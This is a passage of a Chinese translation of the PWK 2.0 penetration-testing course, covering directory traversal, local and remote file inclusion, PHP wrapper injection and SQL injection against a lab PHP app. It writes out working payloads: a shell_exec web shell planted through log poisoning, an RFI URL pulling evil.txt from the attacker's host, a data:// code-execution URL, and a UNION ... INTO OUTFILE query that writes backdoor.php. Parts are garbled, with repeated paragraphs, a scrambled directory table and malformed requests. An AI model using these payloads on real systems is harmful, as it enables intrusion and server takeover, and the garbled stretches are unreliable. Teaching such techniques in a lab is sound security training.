+从主索引页，点击 "Menu" 显示示例菜单以及带有值为 "`current_menu.php`" 的参数：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_310_1.png)
+
+图 15: 寻找文件
+
+点击 "Menu" 后，URL 已更新并出现了一个名为 `file` 值为 "`current_menu.php`" 的参数。参数值中的文件扩展名通常是应该调查的好迹，因为它暗示正在包含其他资源。大多数目录遍历并不是这种，而是旧 PHP 应用程序以简单方式加载的问题。
+
+在不知道代码外观的情况下，我们可以通过更改 `file` 的值进行探测。如果我们将 "`current_menu.php`" 改为类似 "`old.php`" 内容，我们将得到错误而不是：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_310_2.png)
+
+# 这是我们当前的菜单。愉快！
+
+```
+Warning: include(old.php): failed to open stream: No such file or C:\xampp\htdocs\menu.php on line 39
+
+include(): Failed to open 'old.php' for inclusion;path=C:\xampp\php\(PEAR) in 'C:\xampp\htdocs\menu.php' on line 39
+```
+
+图 15: 在应用程序中生成错误
+
+注意错误信息指示服务器无法打开文件进行包含并返回了完整路径。这表明我们可以通过操作文件参数来控制页面中渲染的内容。如果我们不知道目标是 Windows 宿主机上的目录，此错误信息将泄露这一点。它还包含了应用程序的源目录信息。在利用目录遍历时，操作系统信息至关重要。
+
+既然我们知道应用程序运行在 Windows 系统上，让我们更新有效负载以目标 Windows 的 hosts 文件。这是 Windows 系统上一个非常有用的文件；它是可靠的，任何用户都可以访问。
+
+将参数值更改为 `c:\windows\system32\drivers\etc\hosts` 并提交该 URL：
+
+```
+http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
+```
+
+
+
+在浏览器中提交此 URL 后，页面包含了 hosts 文件的内容：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_311_0.png)
+
+### 这里是我们当前的内容。
+#(c) 1993-2009 Microsoft Corp. # 这是一个 Windows 用于 TCP/IP 使用的示例 HOSTS 文件。 # 此文件包含 IP 地址到主机的映射。每个条目应单独保留在一行。IP 地址应放在第一列，对应相应的主机名。 # IP 地址和主机名之间至少用一个 # 符号分隔。 # 此外，注释（如这些）可以插入到单独的行，或者插入在机器名之后并以 # 符号缩进的行中。 # 例如 # 102.54.94.79 #acme.com # 源服务器 #38.25.63.10 #acme.com # 客户端 # localhost 名称解析由 DNS 本身处理。 # 127.0.0.1 #:: localhost
+
+图 15：尝试导出目录漏洞
+
+太棒了。这种目录遍历漏洞允许我们读取任何类型的文件，包括 Web根目录之外的文件。
+
+## 9.4.3.2 练习
+
+- 1. 利用目录遍历在我们的 Windows 10 机器上读取任意文件。
+
+## 9.4.4 文件包含漏洞
+
+与仅仅显示文件内容的目录遍历不同，文件包含漏洞^{275}允许攻击者将文件包含到运行的 PHP 代码中。
+
+为了利用文件包含漏洞，我们不仅必须能够执行代码，还要将我们的有效负载写入某处。
+
+本地文件包含（LFI）发生在从 Web 服务器加载被包含的文件时。远程文件包含（RFI）发生在从外部源加载文件时。这些漏洞常见于 PHP 应用程序，但也可能出现在其他编程语言中。这些漏洞的利用取决于应用程序编写的编程语言和服务器配置。在 PHP 的情况下，语言运行时函数和^{275}(Wikipedia, 2019), https://en.wikipedia.org/wiki/File_inclusion_vulnerability Penetration Testing with Kali Linux 2.0 web 服务器配置，特别是 `php.ini` 中的 `register_globals` 和 `allow_url_wrappers` 值，会对这些漏洞的利用方式产生巨大影响。
+
+> Windows 10 实验机器上的 php 文件位于 `C:\xampp\php\php.ini`。在对此文件进行任何更改之前，请考虑备份。
+
+注意，目录遍历漏洞通常与 LFI 结合使用，特别是在 LFI 负载中指定文件。
+
+### 9.4.4.1 识别文件包含漏洞
+
+发现文件包含的方法与目录遍历相同。我们定位可以操作的参数并尝试加载任意文件。然而，文件包含更进了一步，因为我们尝试在应用程序中执行文件的内容。
+
+我们还应该考虑这些参数，看看通过将它们的值更改为 URL 而不是本地路径，是否容易受到远程包含（RFI）。我们可能会发现 RFI 漏洞，因为现代 PHP 版本的默认配置禁用了 URL 包含（这是执行远程代码的关键功能）。然而，我们仍然会测试 RFI，因为它们通常比 LFI 更容易利用。我们可以使用 Netcat、Apache 或 Python 来处理请求，就像我们之前使用 get 一样。我们可能需要在不同的端口上尝试有效负载，因为目标服务器发起的任何远程连接都受到内部防火墙或路由规则的影响。可能需要一些尝试。
+
+### 9.4.4.2 利用文件包含 (LFI)
+
+让我们回到 Windows 10 实验上的示例应用程序。我们将从目录攻击的中断处继续，查看 `menu.php` 的源代码以明确我们正在做什么：
+
+```php
+<?php
+
+$file = $_GET["file"];
+
+include $file;
+
+?>
+```
+
+应用程序从请求查询字符串读取 `file` 参数，然后使用该参数配合 `include`^{276} 语句。这意味着执行将执行指定文件中的任何 PHP 代码。如果应用程序是以读取模式打开文件并使用 `echo` 显示内容，则文件中的任何代码将只显示而不执行。
+
+如果我们以某种方式将 PHP 代码写入本地文件，我们可能能够将此漏洞推向远程代码执行。由于我们无法向服务器上传文件，我们有哪些选择？
+
+^276 (The PHP Group, 2019), https://www.php.net/manual/en/function.php
+
+### 9.4.4.3 污染日志文件
+
+我们尝试向服务器注入代码的方法是通过日志文件中毒。大多数应用程序服务器都会记录所有请求的 URL。我们可以通过提交包含我们 PHP 有效负载的请求来利用这一点。（注：此处原文存在大量重复，翻译时已根据逻辑流进行整合）。
+
+### 9.4.4.4 LFI 代码执行
+
+接下来，我们将利用 LFI 漏洞包含包含我们 PHP 有效负载的 Apache `access.log` 文件。我们知道应用程序正在使用 `include` 语句来显示被包含的文件的内容并将其作为 PHP 执行。
+
+我们将构建一个包含日志位置以及要执行的命令（`ifconfig`）的 URL：
+
+```
+http://10.11.0.22/menu.php?file=c:apache\logs\access.log&cmd=ifconfig
+```
+
+一旦 URL 发送到 Web 服务器，输出应该像这样：
+
+图 15：利用 LFI 漏洞执行代码
+
+如果一切运行正常，页面主体应包含 `ifconfig` 的输出。
+
+# 攻性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+那么这里到底发生了什么？得益于应用程序的 PHP `include` 语句以及我们指定包含哪个文件的能力（列表 295），被污染的 `access.log` 文件的内容被网页执行了。
+
+PHP 引擎会将日志文件文本中的 `<?php echo shell_exec($_GET['cmd']);?>` 部分（我们的有效负载）结合 `cmd` 值为 '`ifconfig`' 进行处理，本质上是在目标上运行 `ifconfig` 并显示输出。日志文件中的额外行之所以被显示，是因为它们不包含 PHP 代码。
+
+这并不是开发者的本意！
+
+现在我们已经演示了如何通过文件投毒（file poisoning）获取代码执行，我们应该能够在系统上获取一个 shell。我们将此留留给读者作为练习。
+
+## 9.4.4.5 练习
+
+- 1. 通过使用 LFI 攻击获取代码执行。
+- 2. 利用代码执行获取一个完整的 shell。
+
+## 9.4.4.6 远程文件包含 (RFI)
+
+远程文件包含（RFI）漏洞比 LFI 少，因为服务器必须经过非常特定的配置，但它们通常更容易利用。例如，PHP 应用程序必须将 `url_include_set` 设置为 'On'。旧版本的 PHP 默认将其设置为 'Off'。如果我们能强制 Web 应用程序加载远程文件并执行代码，我们在创建攻击有效负载时将会有更大的灵活性。
+
+让我们来看一个 RFI 漏洞的示例。之前演示的 LFI 漏洞同样容易受到 RFI 攻击。考虑以下内容：
+
+> `http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt`
+
+列表 300 - 使用文件参数作为 RFI 有效负载
+
+这将请求 PHP 服务器尝试包含来自我们 Kali 机器的远程文件。我们可以通过在 Kali 机器上启动一个 netcat 监听器，并在我们的 Windows 10 上提交该 URL 来实现：
+
+```
+kal@kali:~ sudo nc -nvlp 80
+
+listening on [any] 80
+
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.2] 50324
+
+GET /evil.txt HTTP/1.0
+
+Host: 10.11.0.4
+
+Connection: close
+```
+
+输出结果显示，当提交 URL 时，Windows 10 机器确实连接了我们的 Kali 机器尝试检索 `evil.txt` 文件。文件已被检索，它将尝试包含并执行它。
+
+尽管这是一个简单的示例，但该 URL 是有效的且流程正在运行，这本质上允许我们加载并执行托管在远程 Web 服务器上的任何文件。
+
+较旧版本的 PHP 有一个关于空字节 `%00` 的漏洞，它会终止任何字符串。这个技巧可以用于绕过服务器端添加的文件扩展名，对于文件包含非常有用，因为它可以防止扩展名被视为字符串的一部分。换句话说，如果应用程序读取一个参数并在其后附加 "php"，参数中的空字节将有效地结束该字符串，而不带上 "php" 扩展名。这让攻击者在利用文件包含漏洞加载哪些文件时具有更强的灵活性。
+
+另一种 RFI 有效负载的技巧是以问号 (`?`) 结尾，将服务器端添加到 URL 的任何内容标记为查询字符串的一部分。
+
+为了看到实际效果，我们可以搭建一个 Apache 服务器来托管一个带有我们在投毒攻击中使用的 PHP 命令的恶意 `evil.txt` 文件。创建文件后，我们将通过一个快速请求刷新 Apache：
+
+```
+kali@kali:/var/www/html5 cat evil.txt
+```
+
+
+
+`<?php echo shell_exec($_GET['cmd']); ?>`
+
+`kali@kali:/var/www/html5 sudo systemctl restart apache`
+
+### 列表 302 - 创建 RFI 有效负载并启动 Apache
+
+一旦文件变为 php 且我们的服务器正在运行，我们就可以向 Windows 10 机器上的漏洞应用程序发送 RFI 攻击 URL，并查看我们的代码是否执行：
+
+```
+http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ifconfig
+```
+
+### 列表 303 - 利用 RFI 漏洞
+
+![](img/f99f528ca9845f4c256ce54e882b1345_316_0.png)
+
+图 157：利用 RFI 漏洞
+
+太棒了。漏洞利用正在工作。我们的代码从远程服务器包含并成功执行。这是一个非常简单的 webshell。
+
+> 278 (The PHP Group, 2019), https://www.php.net/manual/en/security.filesystemnullbytes.php
+
+# 攻性安全
+
+Webshell 是一种提供基于 Web 的命令行界面的小型软件，使其使用变得更加方便快捷。有许多类型的 webshell，Kali 在 `/usr/share/webshells` 中包含了它们，它们用许多常见的 Web 编程语言编写。如既往，在使用它们之前请检阅这些文件的内容。
+
+基于这些简单示例的成功，我们可以使用 Apache（或其他 HTTP 服务器）来托管这些用于 RFI 的 webshells，从而扩展我们的能力。
+
+既然我们已经可以在服务器上执行代码，那么借助 Kali Linux 自带的 webshell，从代码执行转向 shell 应该是轻而易举的。
+
+## 9.4.4.7 练习
+
+- 1. 利用 LFI 漏洞。
+- 2. 使用 data 包装注入 PHP 代码。
+- 3. 使用 data 获取 shell。
+
+## 9.4.4.8 扩展你的工具箱
+
+现在我们已经学习了基础知识，让我们来看一些替代方案。首先，看看 Apache。我们还可以使用内置的 Python 服务器。注意以下示例使用的是 Python 3：
+
+```bash
+kali@kali:/var/www/html5 python3 -m http.server 80
+```
+
+Python 2 的语法略有不同：
+
+```bash
+kali@kali:/var/www/html5 python -m SimpleHTTPServer 80
+```
+
+我们还可以使用 PHP内置服务器：
+
+```bash
+kali@kali:/var/www/html5 php -S 0.0.0.0:80
+```
+
+## 9.4.4 包装器 (Wrappers)
+
+PHP 提供了几种用于利用目录遍历和本地文件漏洞的协议包装器。这些过滤器尝试注入 PHP 时提供了灵活性。
+
+我们可以使用 data 在 URL 中内联明文或 base64 编码数据。这为我们无法投毒本地文件的情况提供了另一种路径。
+
+让我们来看看如何使用 data。我们以 `text/plain` 开始表示明文。后面是 `hello`，标记内容的开始，在本例中为 "hello world"。当它们组合在一起时，我们得到了 `data:text/plain,hello world`。
+
+我们已经知道菜单容易受到 LFI 攻击。如果我们提交一个使用包装器的负载，应用程序应该像处理普通文件一样处理它并包含。让我们通过提交 data URL 并检查结果来确认是否有效：
+
+```
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+```
+
+### 列表 309 - 使用 data 包装器的测试负载
+
+> 279 (The PHP Group, 2019), https://www.php.net/manual/en/wrappers.php
+> 280 (The PHP Group, 2019), https://www.php.net/manual/en/wrappers.data.php
+> 281 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Base64
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+OFFENSIVE SECURITY
+www.offensivesecurity.com
+
+让我们它是如何渲染的：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_319_0.png)
+
+正如所料，应用程序将数据包装器视为文件并包含在页面中，显示了我们的“hello world”字符串。
+
+既然明文数据包装器有效，让我们看看能推行到什么程度。我们知道此页面存在 LFI（本地文件包含）漏洞，上一个示例证明了可以使用数据包装器注入内容。让我们将“hello world”替换为 PHP 代码并检查它是否执行。我们将使用 `shell_exec` 来运行 `dir` 命令，并封装在 PHP 标签中。此时，URL 如下：
+
+```
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+
+
+
+列表 310 - 使用数据包装器的示例 LFI 载荷
+
+![](img/f99f528ca9845f4c256ce54e882b1345_319_1.png)
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. 保留所有权利。
+
+让我们提交它，如果有效：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_320_0.png)
+
+# Tom 的塔可车菜单。祝愉快！
+
+驱动器卷无标签。卷序列号为 0xA14A77 的 `C:\xampp\htdocs` 2019-08-09 10:27 AM
+
+| 日期 | 时间 | 大小 | 名称 |
+| :--- | :--- | :--- | :--- |
+| 2019-08-09 | 上午 10:27 | | |
+| 2019-06-17 | 上午 11:59 | | |
+| admin | 2019-03-13 | 上午 07:00 | 1.773 | index.php |
+| 2019-02-27 | 上午 03:36 | 3.606 | applications.html |
+| 2019-05-30 | 下午 01:01 | 122 | |
+| phut | 2019-07-22 | 上午 03:36 | 1.377 | |
+| 2019-08-09 | 上午 02:12 | | |
+| cas | 2019-09-12 | 上午 23:56 | 286 | current_menu.php |
+| 2019-05-25 | 下午 12:30 | | |
+| dashboard | 2019-09-30 | 下午 23:14 | 214 | database.php |
+| 2019-05-31 | 上午 07:20 | 1.763 | debug.php |
+| 2019-06-13 | 07 | | | |
+| 2019-07-29 | 上午 12:24 | 7.324 | delete.php |
+| 2019-05-15 | 上午 07:16 | 92 | | |
+| 30.894 | favicon.ico | 2019-05-31 | 上午 05:41 | 2,142 |
+| feedback.php | 2019-06-17 | 下午 12:00 | | |
+| form | | | | |
+| img | 2015-07-16 | 上午 09:32 | 250 | index.php |
+| 2019-08-09 | 上午 09:13 | 1.279 | index.php |
+| 2019-05-31 | 上午 05:36 | 2,134 | login.php |
+| 2019-06-10 | 上午 09:33 | 1.167 | menu.php |
+| 2019-05-31 | 上午 05:36 | 1,206 | | |
+| menu2 | 2019-05-31 | 上午 07:06 | 79 | robots.txt |
+| 2019-05-31 | 上午 04:59 | 1,330 | submit_feedback.php |
+| 2019-05-27 | 下午 12:30 | | | |
+| webizer | 2019-05-27 | 下午 12:30 | | |
+| xamp | 17 (File.exe) | 49,857 | 9 目录(s) | 40,103,419,904 字节可用
+
+图 159：使用数据包装器利用 LFI
+
+太棒了。包含在数据包装器中的 PHP 代码在服务器端执行，产生了目录列表。我们现在可以在不操作任何本地文件的情况下利用 LFI。
+
+## 9.4.10 练习
+
+1. 使用 PHP 包装器利用 LFI 漏洞。
+2. 使用 PHP 包装器在 Windows 机器上获取 shell。
+
+## 9.4.5 SQL 注入
+
+SQL 注入是一种当未过滤的用户输入插入到查询并随后传递给数据库时发生的常见应用程序漏洞。查询用于与数据库交互，例如插入或检索数据。如果我们能向查询中注入恶意输入，就可以“跳出”开发者编写的查询并引入我们自己的操作。这些类型的漏洞可能导致数据库泄露，取决于环境，可能会导致服务器被完全破坏。
+
+在本节中，将在 MariaDB 环境下检查 SQL 注入攻击。对于其他数据库，概念是相同的，但在攻击期间使用的语法可能需要更新以适应不同的引擎。MariaDB 非常类似于 MySQL 的分支。尽管存在一些差异，但大多数内容对攻击者无关。
+
+### 9.4.5.1 基本 SQL 语法
+
+结构化查询语言 `SQL` 是与数据库交互的主要语言。尽管有 SQL 标准，但大多数数据库软件都有实现变。然而，基本知识通常是相同的。让我们通过一些基本概念和语法来感受。关系数据库由一个或多个表组成，表中的每个条目称为行。看这个例子：
+
+| id | username | password |
+| :--- | :--- | :--- |
+| 1 | tom.jones | unusual |
+
+列表 311 - 示例 `users` 表
+
+在此表中，列为 `id`、`username` 和 `password`。有一行数据名为 `tom.jones`，`password` 为 `unusual`。在大多数情况下，我们将处理查询。查询是给数据库引擎的指令，我们使用它们来检索或操纵数据。最基本的交互是：
+
+```
+SELECT * FROM users;
+```
+
+这是一个简单的 `SELECT` 查询
+
+我们可以将列表 312 中的查询转述为“显示 `users` 表中的所有列和记录”。`SELECT` 命令的第一部分是列，星号是表示“所有”的特殊字符。我们还有选项在我们的查询中引入条件子句：
+
+```
+SELECT username FROM users WHERE id=1;
+```
+
+列表 313 - 带有 `where` 子句的 `select` 查询
+
+我们可以将列表 313 中的查询转述为“显示 `users` 表中的 `username` 字段，仅显示 `id` 为 1 的记录”。这些是基本知识。我们还可以 `INSERT`、`UPDATE` 和 `DELETE`。在这里不涵盖这些语句，但在展示如何利用 SQL 注入将涵盖其他 SQL 语法。
+
+### 9.4.5.2 识别 SQL 注入漏洞
+
+在利用 SQL 注入漏洞之前，我们必须识别数据可能通过数据库的位置。身份验证通常由数据库支持，根据 Web 应用程序的性质，其他区域包括电子商务网站上的产品或论坛上的消息线程。
+
+我们可以使用单引号 (`'`)（SQL 使用其作为字符串分隔符）作为潜在 SQL 注入漏洞的简单检查。如果应用程序没有正确处理此字符，可能会导致数据库错误，并表明存在 SQL 注入漏洞。一旦知道这一点，我们通常通过向可能遗漏的字段注入单引号来开始攻击。在黑盒测试时，我们需要使用触发错误的方法。
+
+如果我们可以访问源代码，可以检查由字符串拼接构建的查询。在 PHP 中，它可能像如下：
+
+```php
+$query = "select * from users where username = 'User' and password = '$pass';
+```
+
+列表 314 - 带有 SQL 查询的简单 PHP 代码
+
+如果用户数据在没有任何任何过滤的情况下包含在 SQL 语句中，发生 SQL 注入的可能性非常高。在情况下，用户可能会使用 `'Tom'` 和 `'password123'` 作为用户名和密码。下面的代码如下：
+
+```php
+$query = "select * from users where username = 'Tom' and password = 'password123';
+```
+
+列表 315 - 正常登录的简单代码
+
+注意提交的值是如何封装在单引号中的。看看如果提交单引号作为值会发生什么：
+
+```php
+$query = "select * from users where username = ''' and password = 'password123';
+```
+
+
+
+列表 316 - 带有 SQL 注入载荷的简单代码
+
+由于引号被用分隔符，上面的查询被读取为空用户名，然后是一个位置错误的字符串 `password = '`，导致了语法错误。如果 Web 应用程序在其页面中显示错误，你将收到如下输出：
+
+> Notice: invalid query: You have an error in your SQL syntax; check the manual that responds to your MariaDB server version for the right syntax to use near `'password123' '` at line 1 `C:\xampp\htdocs\login.php` on line 28
+
+列表 317 - 示例 SQL 错误消息
+
+这条消息告诉我们几点：我们在 SQL 语句中引起了错误，数据库软件是 `MariaDB`，服务器在 Windows 上运行 `XAMPP`。让我们看看如何利用此漏洞来获取访问。
+
+### 9.4.5.3 身份验证绕过
+
+身份验证绕过是利用 注入的一个经典示例。考虑上一节中的代码示例。如果我们能够将我们的代码注入 SQL 语句中，我们如何以有利于我们的的方式修改查询？
+
+这是为了绕过身份验证。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+为了实验这些查询及其对数据库的影响，我们可以直接连接到 Windows 10 实验机器上的数据库，使用 MySQL 用户名和密码 `root/root` 并执行 SQL 语句：
+
+```
+c:\xampp\mysql\bin> mysql -u root -p
+...
+```
+
+`MariaDB [(none)] use webappdb;`
+`Database changed`
+
+`MariaDB [[webappdb]] select * from users;`
+
+| id | username | password |
+|----|----------|----------|
+| 1 | admin | p@ssword |
+| 2 | jigsaw | footworkl |
+
+2 rows in set (0.01 sec)
+
+Listing 322 - 连接到 MariaDB 实例
+
+现在让我们在示例应用程序上再次尝试，尝试在没有有效凭据的情况下登录。通过包含 `"or 1=1 LIMIT 1"` 子句并注释掉查询的剩余部分，我们应该能够骗应用程序让我们在没有密码的情况下进入。我们并不确定查询的具体写法，但 `"or"` 子句将为真，从而导致查询返回记录。我们将包含 `"LIMIT"` 子句以保持简单并仅返回一条记录。我们将在 `"username"` 字段中提交我们的负载：
+
+![](img/f99f528ca98454c256ce54882b1345_324_0)
+
+图 160：利用 SQL 注入
+
+# 使用 Kali Linux 进行渗透测试
+
+如果我们操纵了查询，我们应该获得一个有效的会话：![](img/f99f528ca98454c256ce54882b1345_325_0)
+
+`tom` 的 `1=1 LIMIT;`
+
+客户反馈
+
+| id | username | Feedback | Action |
+|---|---|---|---|
+| 1 | Jake | Great cooks today! | Delete |
+| 2 | John | I would eat tacos every day if I could! | Delete |
+| 5 | coolguy | | Delete |
+
+> 图 161：访问管理员页面
+
+发生了什么：我们绕过了此应用程序的登录！让我们查看源代码以充分理解
+
+```php
+session_start();
+
+include "database.php";
+
+if (empty($_POST['username']) && isset($_POST['password'])) {
+
+    $sql = "select * from users where username = '" . $_POST['username'] . "' and password = '" . $_POST['password'] . "'";
+
+    $result = $conn->query($sql);
+
+    if (!$result) {
+
+        trigger_error("invalid query: " . $conn->error);
+
+    }
+
+    if ($result->num_rows == 1) {
+
+        $_SESSION['user'] = $_POST['username'];
+
+        header("Location:admin.php");
+
+    } else {
+
+        echo "<div class='alert-danger'>Wrong username or password</div>";
+
+    }
+
+}
+```
+
+> Listing 323 - `login.php` 的代码片段
+
+在行中，提交的 `username` 和 `password` 值直接添加到 SQL 查询中。通常情况下，只有当提交有效的用户名和密码时查询才会返回结果。我们的 SQL 注入负载“逃逸”了预期的查询并注入了 `"OR"` 子句，导致即使用户名和密码不正确查询也会返回行。
+
+行 检查查询结果是否为一行。如果提交了无效的用户名或密码，查询将返回任何行。如果提交了有效的用户名和密码，查询将返回一行。应用程序的开发者认为这足以判断用户是否应该通过验证，行 23 将用户名存储在状态中，行 24 将用户重定向到 `admin.php`。
+
+我们必须包含 `"LIMIT"` 子句来处理行 24 的检查。攻击者即使不查看源码也能知道这一点，这就是为什么黑盒测试中实验非常重要。
+
+> 我们如何防止 SQL 注入？一种简单的方法是在清理用户输入时删除所有单引号。然而，有时单引号应该被视为有效输入。
+
+> 的方法的方法使用参数化查询，也称为预语句。此功能允许开发者在 SQL 语句中使用参数或占位符。用户输入与语句一起插入，数据库绑定语句，在 SQL 语句代码和数据值之间创建一个隔离。这防止了用户提供的数据操纵 SQL 代码。大多数数据库系统和编程语言都支持预语句。
+
+# 9.4.5.4 练习
+
+1. 与 `MariaDB` 数据库交互并手动执行身份验证所需的命令。理解该漏洞。
+2. SQL 注入用户名字段以绕过登录过程。
+3. 绕过验证后，用户名为什么在 Web 应用程序中显示显示？
+4. 在密码字段中执行 SQL 注入。负载中的 `"LIMIT 1"` 是必要的吗？为什么或为什么不
+
+# 9.4.5.5 枚举数据库
+
+我们可以使用 SQL 注入攻击来枚举数据库。我们需要这些信息来构建更复杂的 SQL 注入负载。例如，如果我们要从中提取数据，我们需要知道列名和表名。这有助于执行精确提取。
+
+让我们检查一些获取这些信息的技巧。应用程序的开发者认为这足以判断用户是否应该通过验证，行 23 将用户名存储在状态中，行 24 将用户重定向到 `admin.php`。
+
+接下来，我们将右键点击请求并选择“Send to Repeater”（发送到 Repeater）。该请求现在应该出现在 Repeater 标签下。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_329_0.png)
+
+注意，请求已过 URL 编码并显示为“`id=1%20order%20by%201`”。这不会影响我们的查询。我们可以调用 Send 来提交查询：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_330_0.png)
+
+图 165：使用 Repeater
+
+# Kali Linux 渗透测试 2.0
+
+响应看起来正常。我们可以使用 Response 面板下的搜索框来搜索“Error”，并验证响应文中没有匹配项：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_331_0.png)
+
+图 166 Repeater 结果
+
+# OFFENSIVE SECURITY 使用 Kali Linux 进行渗透测试 2.0
+
+接下来，我们可以触发 `order_by` 子句并发送查询，直到收到错误消息。我们可以使用 Response 面板下的搜索框来突出显示响应中的错误：
+
+| Dashboard | Target | Project | Repeater | Proxy | Intruder | Sequencer | Decoder | Comparator | Extender | Project options | User options |
+|---|---|---|---|---|---|---|---|---|---|---|---|
+| 1 | 2 | | | | | | | | | | | |
+
+| Send | Cancel | < | > | |
+|---|---|---|---|---||
+
+```
+GET /debug.php?id=2order_by=523852 HTTP/1.1
+```
+
+
+
+Host: 10.0.2.5 (X11; Linux x86_64; rv:60.0)
+
+User-Agent: Firefox/60.0
+
+Accept-Language: en-US,en;q=0.9
+
+Accept-Encoding: gzip, deflate;q=0.7
+
+Cookie: PHPSESSID=ec931u84v69eg82b1ya667
+
+Connections: keep-alive
+
+Upgrade-Insecure-Requests: 1
+
+![](img/f99f528ca9845f4c256ce54e882b1345_332_0.png)
+
+由于 `order_by` 子句在第四次迭代产生了错误，我们知道查询返回了三列。
+
+## 9.4.5.7 理解输出布局
+
+现在我们知道表中有多少列了，可以使用此信息通过 `UNION` 语句提取更多数据。`Union` 允许我们在原始查询中添加第二个选择，但每个 `select` 语句必须返回相同数量的列。
+
+我们通过枚举查询了这三列。然而，网页上只显示了两个列。我们的下一步是确定哪些列被显示了。如果我们使用 `union` 来提取有用数据，我们希望确保数据被显示出来。
+
+我们需要改进输出，以便构建有意义的数据库提取。首先，让我们了解页面上显示了哪些列。我们将使用 `UNION` 来做到这一点。我们可以使用字面量值，而不是从表中查找值。由于我们有三列，我们将在有效负载中添加 `union select 1, 2, 3`。下一个状态将返回一个带有三列（值为 1, 2 和 3）的行。我们的有效负载如下：
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 333
+
+Kali Linux 渗透测试 2.0
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3
+```
+
+列表 326 - 更新我们的有效负载以使用 `union`
+
+页面显示了不同列的位置，如下所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_333_0.png)
+
+图 168：查看 Union 有效负载的结果
+
+我们可以看到第一列没有显示，第二列显示在 `name` 字段中，第三列显示在 `Comment` 字段中。`Comment` 字段有更大的空间，因此这是我们未来攻击输出的逻辑位置。
+
+> 如果这些内容有任何不清楚的地方，现在是再次连接数据库并尝试这些查询的好时机。你不需要成为经验丰富的数据库管理员来利用 SQL 注入；你对 SQL 以及这些查询越熟悉，从 SQL 错误信息到成功利用 SQL 注入漏洞就越容易。
+
+## 9.4.5.8 从数据库中提取数据
+
+我们现在可以开始从数据库中提取信息了。以下示例使用了 MariaDB 的特定命令。然而，大多数数据库提供类似的功能，只是语法略有不同。无论我们的目标是什么数据库软件，了解特定平台的命令都是最好的。
+
+例如，要输出 MariaDB 的版本，可以使用 URL：
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @version
+```
+
+列表 327 - 用于提取数据库版本的 SQL 注入
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 334
+
+这应该在 `name` 字段中输出“2”，并在 `comment` 字段中输出数据库版本号：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_334_0.png)
+
+很好。看起来起作用了。让我们用这个查询输出当前用户：
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, user()
+```
+
+列表 328 - 用于提取数据库用户的有效负载
+
+该查询显示 `root` 用户用于数据库查询：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_334_1.png)
+
+图 170 Repeater 结果
+
+我们现在可以开始从数据库中提取信息。以下示例使用了 MariaDB 的特定命令。然而，大多数数据库提供类似的功能，只是语法略有不同。无论我们的目标是什么数据库软件，了解特定平台的命令都是最好的。
+
+例如，要输出 MariaDB 的版本，可以使用 URL：
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @version
+```
+
+列表 327 - 用于提取数据库版本的 SQL 注入
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+此输出显示了主机的内容：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_338_0.png)
+
+图 174：使用加载函数
+
+接下来，我们将使用 `INTO OUTFILE` 在服务器的 Web 根目录下创建一个恶意 PHP 文件。根据我们已经看到的错误信息，我们应该知道 Web 根目录的位置。我们将尝试写入一个简单的 PHP 脚本，类似于 LFI 示例中使用的那个：
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE "C:\xampp/htdocs/backdoor.php"
+```
+
+列表 334 - 使用 `OUTFILE` 函数写入 PHP Shell 的 SQL 注入负载
+
+如果执行成功，文件将放置在 Web 根目录下：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_338_1.png)
+
+图 175：利用 SQL 注入写入 PHP Shell
+
+此命令产生了一个错误信息，但这并不意味着文件创建失败。让我们尝试使用 `ipconfig` 等 `cmd` 参数访问新创建 `backdoor.php` 页面：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_339_0.png)
+
+图 176：使用后门 PHP 命令 Shell
+
+太棒了。我们现在已经将 SQL 注入漏洞转换为服务器上的代码执行。我们可以通过安装 webshell 轻松将其扩展为完全 Shell 访问。
+
+## 9.4.11 练习
+
+- 1. 使用 MariaDB `INTO OUTFILE` 函数利用 SQL 注入获取代码执行权限。
+- 2. 将简单的代码执行转换为完全 Shell。
+
+## 9.4.12 自动化 SQL 注入
+
+借助 Kali Linux 中安装的几个工具，可以完成 SQL 注入过程。其中较常用的工具之一是 `sqlmap.289`，它可以用于识别和利用跨数据库的 SQL 注入漏洞。
+
+让我们在示例应用上使用 `sqlmap`。我们将使用 `-u` 设置要扫描的 URL，并使用 `-p` 指定要测试的参数。
+
+```
+kali@kali:~$ sqlmap -u http://10.11.0.2/debug.php?id=1 -p "id"
+```
+
+```
+[13:53:45] INFO 启发 (基础) 测试显示 GET 参数 'id' 可能是
+注入的 (dbms: 'MySQL')
+[13:53:45] INFO 启发 (XSS) 测试显示 GET 参数 'id' 可能会
+受到跨站脚本 (XSS) 攻击
+[13:53:45] INFO 正在对 GET 参数 'id' 测试 SQL 注入
+看起来后端 DBMS 是 'MySQL'。你是否想测试针对
+其他 DBMS 的特定负载？ [Y/n]
